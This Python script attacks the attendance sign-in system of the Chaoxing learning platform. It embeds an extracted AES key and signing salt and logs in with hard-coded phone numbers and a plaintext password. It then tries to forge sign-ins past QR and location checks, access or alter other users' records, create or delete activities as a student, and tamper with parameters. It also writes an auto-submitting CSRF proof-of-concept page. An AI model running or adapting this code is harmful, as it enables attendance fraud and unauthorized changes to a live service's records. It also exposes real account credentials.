#!/usr/bin/env python3
"""
深挖学生端可直接利用的攻击路径
聚焦：1.学生直接签到API 2.二维码绕过 3.IDOR 4.CSRF
"""
import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

print("=" * 80)
print("深挖学生端可直接利用的攻击路径")
print("=" * 80)

# 登录
print("\n[1] 登录账号...")
s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"  学生puid={puid_s}, 教师puid={puid_t}")

# 获取当前活动列表
print("\n[2] 获取签到活动列表...")
r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)
activities = []
if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        aid = str(item.get("id", ""))
        atype = item.get("activeType", "")
        status = item.get("status", "")
        name = item.get("nameOne", "")
        activities.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
        print(f"  活动: id={aid}, type={atype}, status={status}, name={name}")

# 找一个未签到的活动
unsigned_aid = None
signed_aid = None
for a in activities:
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
                params={"activeId": a["id"], "uid": puid_s}, timeout=20)
    d = safe_json(r)
    st = get_status(d)
    if st is None:
        unsigned_aid = a["id"]
        print(f"  未签到活动: {a['id']} (type={a['type']}, name={a['name']})")
    elif st is not None and signed_aid is None:
        signed_aid = a["id"]
        print(f"  已签到活动: {a['id']} (status={st})")

if not unsigned_aid:
    print("  没有未签到的活动，需要教师创建一个")
if not signed_aid:
    signed_aid = activities[0]["id"] if activities else None

# ======================================================================
# 攻击路径1: 学生直接签到API (stuSignajax)
# 这是学生正常签到的API，测试能否绕过二维码验证直接签到
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径1] 学生直接签到API - stuSignajax")
print("=" * 80)

test_aids = [a["id"] for a in activities[:3]]
if not test_aids:
    test_aids = [signed_aid] if signed_aid else []

for aid in test_aids:
    print(f"\n--- 测试活动 aid={aid} ---")

    # 先查询当前状态
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    before_status = get_status(d)
    print(f"  当前状态: status={before_status}")

    # stuSignajax - 标准参数（模拟正常签到）
    sign_data = {
        "activeId": aid,
        "uid": puid_s,
        "clientip": "",
        "latitude": "-1",
        "longitude": "-1",
        "appType": "15",
        "fid": "0",
    }
    r = s_s.post(f"{BASE}/pptSign/stuSignajax", data=sign_data, headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax(标准): {r.text[:200]}")

    # stuSignajax - 带位置信息
    sign_data_loc = {
        "activeId": aid,
        "uid": puid_s,
        "clientip": "",
        "latitude": "39.908823",
        "longitude": "116.397470",
        "appType": "15",
        "fid": "0",
        "address": "北京市天安门广场",
    }
    r = s_s.post(f"{BASE}/pptSign/stuSignajax", data=sign_data_loc, headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax(带位置): {r.text[:200]}")

    # stuSignajax - GET方式
    r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=sign_data, timeout=20)
    print(f"  stuSignajax(GET): {r.text[:200]}")

    # 验证是否真的签到了
    time.sleep(2)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after_status = get_status(d)
    if after_status != before_status:
        print(f"  *** 状态变化! {before_status} -> {after_status} ***")
    else:
        print(f"  状态未变: {after_status}")

# ======================================================================
# 攻击路径2: 二维码绕过 - updateqrstatus / enc参数
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径2] 二维码绕过")
print("=" * 80)

for aid in test_aids:
    print(f"\n--- 测试活动 aid={aid} ---")

    # updateqrstatus - 这是二维码签到的核心API
    # 正常流程: 教师发起签到 -> 生成enc -> 学生扫码 -> updateqrstatus验证enc
    # 测试: 能否伪造enc参数绕过验证?
    r = s_s.get(f"{BASE}/pptSign/updateqrstatus",
                params={"activeId": aid, "uid": puid_s, "enc": "test"},
                timeout=20)
    print(f"  updateqrstatus(enc=test): HTTP {r.status_code}, {r.text[:200]}")

    # 尝试空enc
    r = s_s.get(f"{BASE}/pptSign/updateqrstatus",
                params={"activeId": aid, "uid": puid_s, "enc": ""},
                timeout=20)
    print(f"  updateqrstatus(enc=空): HTTP {r.status_code}, {r.text[:200]}")

    # 尝试POST
    r = s_s.post(f"{BASE}/pptSign/updateqrstatus",
                 data={"activeId": aid, "uid": puid_s, "enc": "test"},
                 headers=ajax_hdr, timeout=20)
    print(f"  updateqrstatus(POST): HTTP {r.status_code}, {r.text[:200]}")

    # preSign - 签到前预处理
    r = s_s.get(f"{BASE}/pptSign/preSign",
                params={"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                timeout=20)
    print(f"  preSign(GET): HTTP {r.status_code}, {r.text[:200]}")

    r = s_s.post(f"{BASE}/pptSign/preSign",
                 data={"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                 headers=ajax_hdr, timeout=20)
    print(f"  preSign(POST): HTTP {r.status_code}, {r.text[:200]}")

# ======================================================================
# 攻击路径3: IDOR - 能否访问/修改其他学生的签到记录
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径3] IDOR - 访问其他学生签到记录")
print("=" * 80)

# 教师端查看签到结果 - 学生能否访问?
for aid in test_aids[:2]:
    print(f"\n--- 测试活动 aid={aid} ---")

    # signedResult - 教师端查看签到结果
    r = s_s.get(f"{BASE}/pptSign/signedResult",
                params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                timeout=20)
    print(f"  学生GET signedResult: HTTP {r.status_code}, len={len(r.text)}, {r.text[:150]}")

    r = s_s.post(f"{BASE}/pptSign/signedResult",
                 data={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers=ajax_hdr, timeout=20)
    print(f"  学生POST signedResult: HTTP {r.status_code}, len={len(r.text)}, {r.text[:150]}")

    # 用教师uid试试
    r = s_s.get(f"{BASE}/pptSign/signedResult",
                params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
                timeout=20)
    print(f"  学生GET signedResult(uid=教师): HTTP {r.status_code}, len={len(r.text)}, {r.text[:150]}")

    # V2 API - 查询其他学生的签到记录
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
                params={"activeId": aid, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    print(f"  学生V2查询教师签到: data={json.dumps(d.get('data', {}), ensure_ascii=False)[:200]}")

# ======================================================================
# 攻击路径4: /newsign/ 路径下其他端点
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径4] /newsign/ 路径其他端点探索")
print("=" * 80)

aid = test_aids[0] if test_aids else "5000163767353"

newsign_endpoints = [
    ("addSignRecord", "添加签到记录"),
    ("saveSignRecord", "保存签到记录"),
    ("createSignRecord", "创建签到记录"),
    ("insertSignRecord", "插入签到记录"),
    ("submitSign", "提交签到"),
    ("doSign", "执行签到"),
    ("studentSign", "学生签到"),
    ("stuSign", "学生签到2"),
    ("sign", "签到"),
    ("signIn", "签到入"),
    ("startSign", "开始签到"),
    ("preSign", "预签到"),
    ("quickSign", "快速签到"),
    ("makeUpSign", "补签"),
    ("resign", "重签"),
    ("addSign", "添加签到"),
    ("createActive", "创建活动"),
    ("getActiveDetail", "获取活动详情"),
    ("activeDetail", "活动详情"),
    ("signDetail", "签到详情"),
    ("getSignDetail", "获取签到详情"),
    ("signInfo", "签到信息"),
    ("getSignInfo", "获取签到信息"),
    ("taskDetail", "任务详情"),
    ("getTaskDetail", "获取任务详情"),
]

for ep, desc in newsign_endpoints:
    data = {
        "activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID,
        "status": "1", "lat": "39.908823", "lng": "116.397470", "address": "北京市"
    }
    r = s_s.post(f"{BASE}/newsign/{ep}", data=data, headers=ajax_hdr, timeout=15)
    resp_text = r.text[:150]
    interesting = "success" in resp_text.lower() or "error" not in resp_text.lower()[:20]
    marker = "<<" if interesting else "  "
    print(f"  {marker} /newsign/{ep} ({desc}): HTTP {r.status_code}, {resp_text}")

# 也测试GET
for ep, desc in newsign_endpoints[:10]:
    params = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}
    r = s_s.get(f"{BASE}/newsign/{ep}", params=params, timeout=15)
    resp_text = r.text[:150]
    interesting = "success" in resp_text.lower() or (r.status_code == 200 and len(r.text) > 50)
    marker = "<<" if interesting else "  "
    print(f"  {marker} /newsign/{ep} GET ({desc}): HTTP {r.status_code}, {resp_text}")

# ======================================================================
# 攻击路径5: /pptSign/ 路径更多端点
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径5] /pptSign/ 路径更多端点")
print("=" * 80)

pptsign_endpoints = [
    "stuSignAjax", "stuSignajaxNew", "stuSignNew", "stuSignV2",
    "signV2", "signNew", "signInV2", "signInNew",
    "qrCodeSign", "qrcodeSign", "scanSign", "scanQrCode",
    "locationSign", "gestureSign", "numberSign",
    "signByCode", "signByEnc", "signByToken",
    "getSignStuInfo", "getStuSignInfo", "stuSignInfo",
    "getSignStatus", "signStatus", "checkSignStatus",
    "activeSignList", "signList", "getSignList",
]

for ep in pptsign_endpoints:
    data = {
        "activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID,
        "status": "1", "latitude": "39.908823", "longitude": "116.397470",
        "enc": "test", "clientip": "", "appType": "15", "fid": "0"
    }
    r = s_s.post(f"{BASE}/pptSign/{ep}", data=data, headers=ajax_hdr, timeout=15)
    resp_text = r.text[:150]
    interesting = "success" in resp_text.lower() or "签到" in resp_text or "sign" in resp_text.lower()[:30]
    marker = "<<" if interesting else "  "
    print(f"  {marker} /pptSign/{ep}: HTTP {r.status_code}, {resp_text}")

# ======================================================================
# 攻击路径6: /v2/apis/ 路径探索
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径6] /v2/apis/ 路径探索")
print("=" * 80)

v2_endpoints = [
    ("sign/signIn", "签到入"),
    ("sign/signUp", "签注册"),
    ("sign/doSign", "执行签到"),
    ("sign/submit", "提交签到"),
    ("sign/modify", "修改签到"),
    ("sign/update", "更新签到"),
    ("sign/cancel", "取消签到"),
    ("sign/makeup", "补签"),
    ("sign/resign", "重签"),
    ("sign/quickSign", "快速签到"),
    ("sign/qrCodeSign", "二维码签到"),
    ("sign/preSign", "预签到"),
    ("active/student/activelist", "学生活动列表"),
    ("active/teacher/activelist", "教师活动列表"),
    ("active/detail", "活动详情"),
    ("active/startSign", "开始签到"),
]

for ep, desc in v2_endpoints:
    params = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}
    r = s_s.get(f"{BASE}/v2/apis/{ep}", params=params, timeout=15)
    resp_text = r.text[:150]
    interesting = r.status_code == 200 and len(r.text) > 20 and "error" not in resp_text.lower()[:20]
    marker = "<<" if interesting else "  "
    print(f"  {marker} /v2/apis/{ep} ({desc}): HTTP {r.status_code}, {resp_text}")

    # POST too for sign endpoints
    if ep.startswith("sign/"):
        data = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID,
                "status": "1", "latitude": "39.908823", "longitude": "116.397470"}
        r = s_s.post(f"{BASE}/v2/apis/{ep}", data=data, headers=ajax_hdr, timeout=15)
        resp_text = r.text[:150]
        interesting = "success" in resp_text.lower() or "签到" in resp_text
        marker = "<<" if interesting else "  "
        print(f"  {marker} /v2/apis/{ep} POST ({desc}): HTTP {r.status_code}, {resp_text}")

# ======================================================================
# 攻击路径7: 签到活动创建/结束 - 学生能否操作
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径7] 签到活动创建/结束 - 学生越权")
print("=" * 80)

# 学生尝试创建签到
r = s_s.post(f"{BASE}/ppt/activeAPI/createActive",
             data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                   "title": "学生越权创建签到"},
             headers=ajax_hdr, timeout=20)
print(f"  学生创建签到: {r.text[:200]}")

# 学生尝试结束签到
r = s_s.post(f"{BASE}/ppt/activeAPI/endSign",
             data={"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID},
             headers=ajax_hdr, timeout=20)
print(f"  学生结束签到: {r.text[:200]}")

# 学生尝试删除活动
r = s_s.post(f"{BASE}/ppt/activeAPI/deleteActive",
             data={"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID},
             headers=ajax_hdr, timeout=20)
print(f"  学生删除活动: {r.text[:200]}")

# ======================================================================
# 攻击路径8: /newsign/updateSignStatus 深入 - 参数篡改
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径8] /newsign/updateSignStatus 参数篡改深入测试")
print("=" * 80)

# 之前确认newsign/updateSignStatus是假success
# 但也许某些参数组合可以真正生效？

# 测试: 不带DB_STRATEGY参数
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             data={"uids": puid_s, "status": "2", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers=ajax_hdr, timeout=20)
print(f"  无DB_STRATEGY: {r.text[:100]}")

# 测试: 带不同DB_STRATEGY
for strategy in ["PRIMARY_KEY", "COURSEID", "CLASSID", "ACTIVEID"]:
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": strategy, "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": puid_s, "status": "2", "remark": "",
                       "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers=ajax_hdr, timeout=20)
    print(f"  DB_STRATEGY={strategy}: {r.text[:100]}")

# 测试: 带不同STRATEGY_PARA
for para in ["activeId", "courseId", "classId", "uid"]:
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": para, "activeId": aid},
                 data={"uids": puid_s, "status": "2", "remark": "",
                       "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers=ajax_hdr, timeout=20)
    print(f"  STRATEGY_PARA={para}: {r.text[:100]}")

# 测试: 修改uids为其他学生
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_t, "status": "2", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers=ajax_hdr, timeout=20)
print(f"  uids=教师puid: {r.text[:100]}")

# ======================================================================
# 攻击路径9: 其他域名/路径
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径9] 其他域名/路径探索")
print("=" * 80)

other_domains = [
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/sign/signIn"),
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/sign/updateSignStatus"),
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/pptSign/stuSignajax"),
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/pptSign/updateSignStatusByUidsV2"),
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/newsign/updateSignStatus"),
    ("https://mooc1-api.chaoxing.com", "/mooc-ans/newsign/signIn"),
    ("https://office.chaoxing.com", "/front/sign/signIn"),
    ("https://office.chaoxing.com", "/front/sign/updateSignStatus"),
]

for domain, path in other_domains:
    try:
        r = s_s.get(f"{domain}{path}",
                    params={"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID},
                    timeout=15)
        print(f"  {domain}{path}: HTTP {r.status_code}, {r.text[:120]}")
    except Exception as e:
        print(f"  {domain}{path}: ERROR {e}")

# ======================================================================
# 攻击路径10: CSRF PoC - 教师V2 API
# ======================================================================
print("\n" + "=" * 80)
print("[攻击路径10] CSRF分析 - 教师V2 API")
print("=" * 80)

# 检查教师V2 API是否有CSRF防护
# 1. 检查是否需要自定义Header
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Content-Type": "application/x-www-form-urlencoded",
                      "Referer": "https://mobilelearn.chaoxing.com/"},
             timeout=20)
print(f"  教师V2(标准Header): {r.text[:150]}")

# 2. 不带X-Requested-With
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  教师V2(无X-Requested-With): {r.text[:150]}")

# 3. 不带任何自定义Header
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             timeout=20)
print(f"  教师V2(无自定义Header): {r.text[:150]}")

# 4. 带不同Referer
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Content-Type": "application/x-www-form-urlencoded",
                      "Referer": "https://evil.com/"},
             timeout=20)
print(f"  教师V2(Referer=evil.com): {r.text[:150]}")

# 5. GET方式（CSRF更容易）
r = s_t.get(f"{BASE}/pptSign/updateSignStatusByUidsV2",
            params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                    "activeId": aid, "uids": puid_s, "status": "1", "remark": ""},
            timeout=20)
print(f"  教师V2(GET方式): {r.text[:150]}")

# 生成CSRF PoC HTML
csrf_poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - 学习通签到状态修改</title></head>
<body>
<h1>CSRF PoC - 修改签到状态</h1>
<p>如果教师已登录学习通，访问此页面将自动修改签到状态</p>
<form id="csrf_form" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}">
    <input type="hidden" name="uids" value="{puid_s}" />
    <input type="hidden" name="status" value="1" />
    <input type="hidden" name="remark" value="" />
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>"""

with open("/workspace/csrf_poc.html", "w", encoding="utf-8") as f:
    f.write(csrf_poc)
print(f"\n  CSRF PoC已保存到 /workspace/csrf_poc.html")

print("\n" + "=" * 80)
print("深挖完成")
print("=" * 80)
